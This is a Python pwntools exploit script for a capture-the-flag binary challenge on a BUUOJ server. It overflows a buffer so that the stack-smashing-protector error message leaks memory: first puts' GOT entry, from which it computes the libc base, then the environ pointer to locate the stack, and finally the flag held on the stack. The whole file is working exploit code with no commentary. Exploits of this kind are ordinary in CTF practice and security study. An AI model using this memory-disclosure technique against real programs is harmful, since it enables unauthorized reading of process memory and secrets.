from pwn import *

sh=remote("node5.buuoj.cn",25637)
elf=ELF("./timu")
libc=ELF("./libc-2.23.so")

puts_got=elf.got["puts"]

payload=0x128*b'a'+p64(puts_got)
sh.recvuntil(b"Please type your guessing flag")
sh.sendline(payload)
sh.recvuntil(b"*** stack smashing detected ***:")
#puts_addr=u64(sh.recv(6).ljust(8,b"\x00"))
puts_addr=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

libc_base=puts_addr-libc.sym["puts"]
print("libc_base=",hex(libc_base))
environ_addr=libc_base+libc.sym["environ"]

payload=0x128*b'a'+p64(environ_addr)
sh.recvuntil(b"Please type your guessing flag")
sh.sendline(payload)
sh.recvuntil(b"*** stack smashing detected ***:")
stack_addr=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
flag_addr=stack_addr-0x168

payload=0x128*b'a'+p64(flag_addr)
sh.recvuntil(b"Please type your guessing flag")
sh.sendline(payload)

sh.interactive()
